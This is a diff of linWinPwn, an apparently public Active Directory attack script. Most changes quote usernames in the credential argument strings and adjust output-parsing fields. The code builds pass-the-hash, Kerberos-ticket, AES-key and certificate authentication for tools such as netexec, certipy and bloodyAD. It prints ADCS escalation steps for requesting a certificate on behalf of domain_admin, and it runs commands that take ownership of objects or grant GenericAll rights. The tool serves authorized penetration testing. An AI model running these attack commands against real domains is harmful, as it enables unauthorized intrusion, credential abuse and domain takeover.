@@ -142,7 +142,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.27 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.28 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -541,43 +541,43 @@ authenticate() {
 
     #Check if password is used
     if [ "${pass_bool}" == true ]; then
-        argument_ne="-d ${domain} -u ${user} -p '${password}'"
-        argument_imp="${domain}/${user}:'${password}'"
-        argument_imp_gp="${domain}/${user}:'${password}'"
-        argument_imp_ti="-user ${user} -password '${password}' -domain ${domain}"
-        argument_bhd="-u ${user}\\@${domain} -p '${password}' --auth-method ntlm"
-        argument_enum4linux="-w ${domain} -u ${user} -p '${password}'"
-        argument_adidns="-u ${domain}\\\\${user} -p '${password}'"
-        argument_ldd="-u ${domain}\\\\${user} -p '${password}'"
-        argument_smbmap="-d ${domain} -u ${user} -p '${password}'"
-        argument_certi_py="${domain}/${user}:'${password}'"
-        argument_certipy="-u ${user}\\@${domain} -p '${password}'"
-        argument_ldeep="-d ${domain} -u ${user} -p '${password}'"
-        argument_pre2k="-d ${domain} -u ${user} -p '${password}'"
-        argument_certsync="-d ${domain} -u ${user} -p '${password}'"
-        argument_donpapi="-d ${domain} -u ${user} -p '${password}'"
-        argument_hekatomb="${domain}/${user}:'${password}'"
-        argument_silenthd="-u ${domain}\\\\${user} -p '${password}'"
-        argument_windap="-d ${domain} -u ${user} -p '${password}'"
-        argument_targkerb="-d ${domain} -u ${user} -p '${password}'"
-        argument_p0dalirius="-d ${domain} -u ${user} -p '${password}'"
-        argument_FindUncom="-ad ${domain} -au ${user} -ap '${password}'"
-        argument_manspider="-d ${domain} -u ${user} -p '${password}'"
-        argument_coercer="-d ${domain} -u ${user} -p '${password}'"
-        argument_bloodyad="-d ${domain} -u ${user} -p '${password}'"
-        argument_aced="${domain}/${user}:'${password}'"
-        argument_sccm="-d ${domain} -u ${user} -p '${password}'"
-        argument_ldapper="-D ${domain} -U ${user} -P '${password}'"
-        argument_adalanche="--authmode ntlm --username ${user}\\@${domain} --password '${password}'"
-        argument_mssqlrelay="-u ${user}\\@${domain} -p '${password}'"
-        argument_pygpoabuse="${domain}/${user}:'${password}''"
-        argument_GPOwned="-d ${domain} -u ${user} -p '${password}'"
-        argument_privexchange="-d ${domain} -u ${user} -p '${password}'"
-        argument_adpeas="-d ${domain} -u ${user} -p '${password}'"
-        argument_adcheck="-d ${domain} -u ${user} -p '${password}'"
-        argument_evilwinrm="-u ${user} -p '${password}'"
-        argument_godap="-u ${user}@${domain} -p '${password}'"
-        argument_mssqlpwner="${domain}/${user}:'${password}'"
+        argument_ne="-d ${domain} -u '${user}' -p '${password}'"
+        argument_imp="${domain}/'${user}':'${password}'"
+        argument_imp_gp="${domain}/'${user}':'${password}'"
+        argument_imp_ti="-user '${user}' -password '${password}' -domain ${domain}"
+        argument_bhd="-u '${user}'\\@${domain} -p '${password}' --auth-method ntlm"
+        argument_enum4linux="-w ${domain} -u '${user}' -p '${password}'"
+        argument_adidns="-u ${domain}\\\\'${user}' -p '${password}'"
+        argument_ldd="-u ${domain}\\\\'${user}' -p '${password}'"
+        argument_smbmap="-d ${domain} -u '${user}' -p '${password}'"
+        argument_certi_py="${domain}/'${user}':'${password}'"
+        argument_certipy="-u '${user}'\\@${domain} -p '${password}'"
+        argument_ldeep="-d ${domain} -u '${user}' -p '${password}'"
+        argument_pre2k="-d ${domain} -u '${user}' -p '${password}'"
+        argument_certsync="-d ${domain} -u '${user}' -p '${password}'"
+        argument_donpapi="-d ${domain} -u '${user}' -p '${password}'"
+        argument_hekatomb="${domain}/'${user}':'${password}'"
+        argument_silenthd="-u ${domain}\\\\'${user}' -p '${password}'"
+        argument_windap="-d ${domain} -u '${user}' -p '${password}'"
+        argument_targkerb="-d ${domain} -u '${user}' -p '${password}'"
+        argument_p0dalirius="-d ${domain} -u '${user}' -p '${password}'"
+        argument_FindUncom="-ad ${domain} -au '${user}' -ap '${password}'"
+        argument_manspider="-d ${domain} -u '${user}' -p '${password}'"
+        argument_coercer="-d ${domain} -u '${user}' -p '${password}'"
+        argument_bloodyad="-d ${domain} -u '${user}' -p '${password}'"
+        argument_aced="${domain}/'${user}':'${password}'"
+        argument_sccm="-d ${domain} -u '${user}' -p '${password}'"
+        argument_ldapper="-D ${domain} -U '${user}' -P '${password}'"
+        argument_adalanche="--authmode ntlm --username '${user}'\\@${domain} --password '${password}'"
+        argument_mssqlrelay="-u '${user}'\\@${domain} -p '${password}'"
+        argument_pygpoabuse="${domain}/'${user}':'${password}''"
+        argument_GPOwned="-d ${domain} -u '${user}' -p '${password}'"
+        argument_privexchange="-d ${domain} -u '${user}' -p '${password}'"
+        argument_adpeas="-d ${domain} -u '${user}' -p '${password}'"
+        argument_adcheck="-d ${domain} -u '${user}' -p '${password}'"
+        argument_evilwinrm="-u '${user}' -p '${password}'"
+        argument_godap="-u '${user}'@${domain} -p '${password}'"
+        argument_mssqlpwner="${domain}/'${user}':'${password}'"
         hash_bool=false
         kerb_bool=false
         unset KRB5CCNAME
@@ -595,11 +595,11 @@ authenticate() {
             $(which openssl) pkcs12 -in "${pfxcert}" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
             if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
                 pem_cert="${output_dir}/Credentials/${user}.pem"
-                echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
+                echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${output_dir}/Credentials/${user}.pem'"
             fi
-            argument_bloodyad="-d ${domain} -u ${user} -c :${pem_cert}"
-            argument_ldeep="-d ${domain} -u ${user} --pfx-file ${pfxcert}"
-            argument_evilwinrm="-u ${user} -k ${pem_cert}"
+            argument_bloodyad="-d ${domain} -u '${user}' -c ':${pem_cert}'"
+            argument_ldeep="-d ${domain} -u '${user}' --pfx-file '${pfxcert}'"
+            argument_evilwinrm="-u '${user}' -k '${pem_cert}'"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath "$pfxcert")${NC}"
             hash_bool=true
         else
@@ -610,43 +610,43 @@ authenticate() {
                 if [ "$(echo "$hash" | cut -d ":" -f 1)" == "" ]; then
                     hash="aad3b435b51404eeaad3b435b51404ee"$hash
                 fi
-                argument_ne="-d ${domain} -u ${user} -H ${hash}"
-                argument_imp=" -hashes ${hash} ${domain}/${user}"
-                argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
-                argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
-                argument_bhd="-u ${user}\\@${domain} --hashes ${hash} --auth-method ntlm"
-                argument_enum4linux="-w ${domain} -u ${user} -H ${hash:33}"
-                argument_adidns="-u ${domain}\\\\${user} -p ${hash}"
-                argument_ldd="-u ${domain}\\\\${user} -p ${hash}"
-                argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
-                argument_certi_py="${domain}/${user} --hashes ${hash}"
-                argument_certipy="-u ${user}\\@${domain} -hashes ${hash}"
-                argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
-                argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
-                argument_donpapi="-H ${hash} -d ${domain} -u ${user}"
-                argument_hekatomb="-hashes ${hash} ${domain}/${user}"
-                argument_silenthd="-u ${domain}\\\\${user} --hashes ${hash}"
-                argument_windap="-d ${domain} -u ${user} --hash ${hash}"
-                argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
-                argument_p0dalirius="-d ${domain} -u ${user} -H ${hash:33})"
-                argument_FindUncom="-ad ${domain} -au ${user} -ah ${hash}"
-                argument_manspider="-d ${domain} -u ${user} -H ${hash:33}"
-                argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
-                argument_aced=" -hashes ${hash} ${domain}/${user}"
-                argument_sccm="-d ${domain} -u ${user} -hashes ${hash}"
-                argument_ldapper="-D ${domain} -U ${user} -P ${hash}"
-                argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
-                argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
-                argument_adalanche="--authmode ntlmpth --username ${user}\\@${domain} --password ${hash}"
-                argument_mssqlrelay="-u ${user}\\@${domain} -hashes ${hash}"
-                argument_pygpoabuse=" -hashes ${hash} ${domain}/${user}"
-                argument_GPOwned="-d ${domain} -u ${user} -hashes ${hash}"
-                argument_privexchange="-d ${domain} -u ${user} --hashes ${hash}"
-                argument_adcheck="-d ${domain} -u ${user} -H ${hash}"
-                argument_evilwinrm="-u ${user} -H ${hash:33}"
-                argument_godap="-u ${user} -d ${domain} -H ${hash}"
-                argument_mssqlpwner="-hashes ${hash} ${domain}/${user}"
-                auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
+                argument_ne="-d ${domain} -u '${user}' -H ${hash}"
+                argument_imp=" -hashes ${hash} ${domain}/'${user}'"
+                argument_imp_gp=" -hashes ${hash} ${domain}/'${user}'"
+                argument_imp_ti="-user '${user}' -hashes ${hash} -domain ${domain}"
+                argument_bhd="-u '${user}'\\@${domain} --hashes ${hash} --auth-method ntlm"
+                argument_enum4linux="-w ${domain} -u '${user}' -H ${hash:33}"
+                argument_adidns="-u ${domain}\\\\'${user}' -p ${hash}"
+                argument_ldd="-u ${domain}\\\\'${user}' -p ${hash}"
+                argument_smbmap="-d ${domain} -u '${user}' -p ${hash}"
+                argument_certi_py="${domain}/'${user}' --hashes ${hash}"
+                argument_certipy="-u '${user}'\\@${domain} -hashes ${hash}"
+                argument_pre2k="-d ${domain} -u '${user}' -hashes ${hash}"
+                argument_certsync="-d ${domain} -u '${user}' -hashes ${hash}"
+                argument_donpapi="-H ${hash} -d ${domain} -u '${user}'"
+                argument_hekatomb="-hashes ${hash} ${domain}/'${user}'"
+                argument_silenthd="-u ${domain}\\\\'${user}' --hashes ${hash}"
+                argument_windap="-d ${domain} -u '${user}' --hash ${hash}"
+                argument_targkerb="-d ${domain} -u '${user}' -H ${hash}"
+                argument_p0dalirius="-d ${domain} -u '${user}' -H ${hash:33})"
+                argument_FindUncom="-ad ${domain} -au '${user}' -ah ${hash}"
+                argument_manspider="-d ${domain} -u '${user}' -H ${hash:33}"
+                argument_coercer="-d ${domain} -u '${user}' --hashes ${hash}"
+                argument_aced=" -hashes ${hash} ${domain}/'${user}'"
+                argument_sccm="-d ${domain} -u '${user}' -hashes ${hash}"
+                argument_ldapper="-D ${domain} -U '${user}' -P ${hash}"
+                argument_ldeep="-d ${domain} -u '${user}' -H ${hash}"
+                argument_bloodyad="-d ${domain} -u '${user}' -p ${hash}"
+                argument_adalanche="--authmode ntlmpth --username '${user}'\\@${domain} --password ${hash}"
+                argument_mssqlrelay="-u '${user}'\\@${domain} -hashes ${hash}"
+                argument_pygpoabuse=" -hashes ${hash} ${domain}/'${user}'"
+                argument_GPOwned="-d ${domain} -u '${user}' -hashes ${hash}"
+                argument_privexchange="-d ${domain} -u '${user}' --hashes ${hash}"
+                argument_adcheck="-d ${domain} -u '${user}' -H ${hash}"
+                argument_evilwinrm="-u '${user}' -H ${hash:33}"
+                argument_godap="-u '${user}' -d ${domain} -H ${hash}"
+                argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
+                auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
             else
                 echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
                 exit 1
@@ -660,7 +660,7 @@ authenticate() {
 
     #Check if kerberos ticket is used
     if [ "${kerb_bool}" == true ]; then
-        argument_ne="-d ${domain} -u ${user} --use-kcache"
+        argument_ne="-d ${domain} -u '${user}' --use-kcache"
         pass_bool=false
         hash_bool=false
         aeskey_bool=false
@@ -673,28 +673,28 @@ authenticate() {
             target_servers=${servers_hostname_list}
             krb5cc_path=$(realpath "$krb5cc")
             export KRB5CCNAME=$krb5cc_path
-            argument_imp="-k -no-pass ${domain}/${user}"
-            argument_enum4linux="-w ${domain} -u ${user} -K ${krb5cc}"
-            argument_bhd="-u ${user}\\@${domain} -k -no-pass -p '' --auth-method kerberos"
-            argument_certi_py="${domain}/${user} -k --no-pass"
-            argument_certipy="-u ${user}\\@${domain} -k -no-pass -target ${dc_FQDN}"
-            argument_ldeep="-d ${domain} -u ${user} -k"
-            argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
-            argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
-            argument_donpapi="-k --no-pass -d ${domain} -u ${user}"
-            argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
-            argument_p0dalirius="-d ${domain} -u ${user} -k --no-pass"
-            argument_FindUncom="-ad ${domain} -au ${user} -k --no-pass"
-            argument_bloodyad="-d ${domain} -u ${user} -k"
-            argument_adalanche="--authmode kerberoscache --username ${user}\\@${domain}"
-            argument_aced="-k -no-pass ${domain}/${user}"
-            argument_sccm="-d ${domain} -u ${user} -k -no-pass"
-            argument_mssqlrelay="-u ${user}\\@${domain} -k -no-pass -target ${target}"
-            argument_pygpoabuse="${domain}/${user} -k -ccache $(realpath "$krb5cc")"
-            argument_GPOwned="-d ${domain} -u ${user} -k -no-pass"
-            argument_evilwinrm="-r ${domain} -u ${user}"
+            argument_imp="-k -no-pass ${domain}/'${user}'"
+            argument_enum4linux="-w ${domain} -u '${user}' -K ${krb5cc}"
+            argument_bhd="-u '${user}'\\@${domain} -k -no-pass -p '' --auth-method kerberos"
+            argument_certi_py="${domain}/'${user}' -k --no-pass"
+            argument_certipy="-u '${user}'\\@${domain} -k -no-pass -target ${dc_FQDN}"
+            argument_ldeep="-d ${domain} -u '${user}' -k"
+            argument_pre2k="-d ${domain} -u '${user}' -k -no-pass"
+            argument_certsync="-d ${domain} -u '${user}' -use-kcache -no-pass -k"
+            argument_donpapi="-k --no-pass -d ${domain} -u '${user}'"
+            argument_targkerb="-d ${domain} -u '${user}' -k --no-pass"
+            argument_p0dalirius="-d ${domain} -u '${user}' -k --no-pass"
+            argument_FindUncom="-ad ${domain} -au '${user}' -k --no-pass"
+            argument_bloodyad="-d ${domain} -u '${user}' -k"
+            argument_adalanche="--authmode kerberoscache --username '${user}'\\@${domain}"
+            argument_aced="-k -no-pass ${domain}/'${user}'"
+            argument_sccm="-d ${domain} -u '${user}' -k -no-pass"
+            argument_mssqlrelay="-u '${user}'\\@${domain} -k -no-pass -target ${target}"
+            argument_pygpoabuse="${domain}/'${user}' -k -ccache $(realpath "$krb5cc")"
+            argument_GPOwned="-d ${domain} -u '${user}' -k -no-pass"
+            argument_evilwinrm="-r ${domain} -u '${user}'"
             argument_godap="-d ${domain} -k -t ldap/${target}"
-            argument_mssqlpwner=" -k -no-pass ${domain}/${user}"
+            argument_mssqlpwner=" -k -no-pass ${domain}/'${user}'"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath "$krb5cc")${NC}"
         else
             echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath "$krb5cc")..."
@@ -708,22 +708,22 @@ authenticate() {
         target_dc=${dc_hostname_list}
         target_sql=${sql_hostname_list}
         target_servers=${servers_hostname_list}
-        argument_ne="-d ${domain} -u ${user} --aesKey ${aeskey}"
-        argument_imp="-aesKey ${aeskey} ${domain}/${user}"
-        argument_bhd="-u ${user}\\@${domain} -aesKey ${aeskey} --auth-method kerberos"
-        argument_certi_py="${domain}/${user} --aes ${aeskey} -k"
-        argument_certipy="-u ${user}\\@${domain} -aes ${aeskey} -target ${dc_FQDN}"
-        argument_pre2k="-d ${domain} -u ${user} -aes ${aeskey} -k"
-        argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k"
-        argument_donpapi="-k --aesKey ${aeskey} -d ${domain} -u ${user}"
-        argument_targkerb="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
-        argument_p0dalirius="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
-        argument_FindUncom="-ad ${domain} -au ${user} --aes-key ${aeskey} -k"
-        argument_aced="-aes ${aeskey} ${domain}/${user}"
-        argument_sccm="-d ${domain} -u ${user} -aes ${aeskey}"
-        argument_mssqlrelay="-u ${user}\\@${domain} -aes ${aeskey} -k"
-        argument_GPOwned="-d ${domain} -u ${user} -aesKey ${aeskey} -k"
-        argument_mssqlpwner="${domain}/${user} -aesKey ${aeskey} -k"
+        argument_ne="-d ${domain} -u '${user}' --aesKey ${aeskey}"
+        argument_imp="-aesKey ${aeskey} ${domain}/'${user}'"
+        argument_bhd="-u '${user}'\\@${domain} -aesKey ${aeskey} --auth-method kerberos"
+        argument_certi_py="${domain}/'${user}' --aes ${aeskey} -k"
+        argument_certipy="-u '${user}'\\@${domain} -aes ${aeskey} -target ${dc_FQDN}"
+        argument_pre2k="-d ${domain} -u '${user}' -aes ${aeskey} -k"
+        argument_certsync="-d ${domain} -u '${user}' -aesKey ${aeskey} -k"
+        argument_donpapi="-k --aesKey ${aeskey} -d ${domain} -u '${user}'"
+        argument_targkerb="-d ${domain} -u '${user}' --aes-key ${aeskey} -k"
+        argument_p0dalirius="-d ${domain} -u '${user}' --aes-key ${aeskey} -k"
+        argument_FindUncom="-ad ${domain} -au '${user}' --aes-key ${aeskey} -k"
+        argument_aced="-aes ${aeskey} ${domain}/'${user}'"
+        argument_sccm="-d ${domain} -u '${user}' -aes ${aeskey}"
+        argument_mssqlrelay="-u '${user}'\\@${domain} -aes ${aeskey} -k"
+        argument_GPOwned="-d ${domain} -u '${user}' -aesKey ${aeskey} -k"
+        argument_mssqlpwner="${domain}/'${user}' -aesKey ${aeskey} -k"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -759,8 +759,8 @@ authenticate() {
                         cd "${current_dir}" || exit
                         if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
                             krb_ticket="${output_dir}/Credentials/${user}.ccache"
-                            echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
-                            echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -K ${krb_ticket}"
+                            echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket'"
+                            echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}'"
                             exit 1
                         else
                             echo -e "${RED}[-] Failed to generate TGT${NC}"
@@ -1111,13 +1111,13 @@ ne_smb_enum() {
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
-        awk '!/\[-|\[+|\[\*/ && /SMB/ {gsub(/ +/, " "); split($10, arr, "\\"); print arr[2]}' "${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" 2>&1
+        awk '!/\[-|\[+|\[\*/ && /SMB/ {gsub(/ +/, " "); split($12, arr, "\\"); print arr[2]}' "${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" 2>&1
         count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" | wc -l)
         echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
     else
         echo -e "${BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}"
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" 2>&1
-        grep -v "\[-\|\[+\|\[\*" "${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 | cut -d "\\" -f 2 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" 2>&1
+        grep -v "\[-\|\[+\|\[\*" "${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12 | cut -d "\\" -f 2 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" 2>&1
         count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" | wc -l | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --computers" >"${output_dir}/DomainRecon/ne_computers_auth_smb_${dc_domain}.txt"
@@ -1136,13 +1136,13 @@ ne_ldap_enum() {
         run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} ldap ${target} -u Guest -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} ldap ${target} -u ${rand_user} -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
-        grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 10 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" 2>&1
+        grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" 2>&1
         count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" | wc -l)
         echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
     else
         echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
         run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
-        grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 10 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" 2>&1
+        grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" 2>&1
         count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" | wc -l)
         echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
     fi
@@ -1150,8 +1150,8 @@ ne_ldap_enum() {
     echo -e ""
     echo -e "${BLUE}[*] DC List Enumeration${NC}"
     run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --dc-list --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>&1
-    grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $10}' >"${output_dir}/DomainRecon/Servers/dc_list_ne_ldap_${dc_domain}.txt" 2>&1
-    grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $12}' >"${output_dir}/DomainRecon/Servers/dc_ip_list_ne_ldap_${dc_domain}.txt" 2>&1
+    grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $12}' >"${output_dir}/DomainRecon/Servers/dc_list_ne_ldap_${dc_domain}.txt" 2>&1
+    grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $14}' >"${output_dir}/DomainRecon/Servers/dc_ip_list_ne_ldap_${dc_domain}.txt" 2>&1
     parse_servers
     echo -e ""
     echo -e ""
@@ -1578,7 +1578,7 @@ breads_console() {
             rm -rf "${HOME}/.breads/${user}_${dc_domain}" 2>/dev/null
             echo "$(date +%Y-%m-%d\ %H:%M:%S); ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt" >>"$command_log"
             (
-                echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n'${password}'${hash}\ncurrent_profile"
+                echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n${password}${hash}\ncurrent_profile"
                 cat /dev/tty
             ) | /usr/bin/script -qc "${breads}" /dev/null | tee -a "${output_dir}/DomainRecon/breads_output_${dc_domain}.txt"
         fi
@@ -1658,6 +1658,7 @@ adcheck_enum() {
 
 ###### adcs_enum: ADCS Enumeration
 ne_adcs_enum() {
+    mkdir -p "${output_dir}/ADCS"
     if [ ! -f "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" ]; then
         echo -e "${BLUE}[*] ADCS Enumeration${NC}"
         if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
@@ -1732,7 +1733,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
             echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx '${user}.pfx' -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1772,7 +1773,7 @@ adcs_vuln_parse() {
         for vulnca in $esc7_vuln; do
             echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Add a new officer:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -add-officer ${user} -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -add-officer '${user}' -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
             echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -enable-template SubCA -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
@@ -2966,7 +2967,7 @@ change_owner() {
                 read -rp ">> " target_ownerchange </dev/tty
             done
             echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner ${target_ownerchange} ${user}" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner ${target_ownerchange} '${user}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2990,7 +2991,7 @@ add_genericall() {
                 read -rp ">> " target_genericall </dev/tty
             done
             echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} ${user}" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_genericall_${dc_domain}.txt"
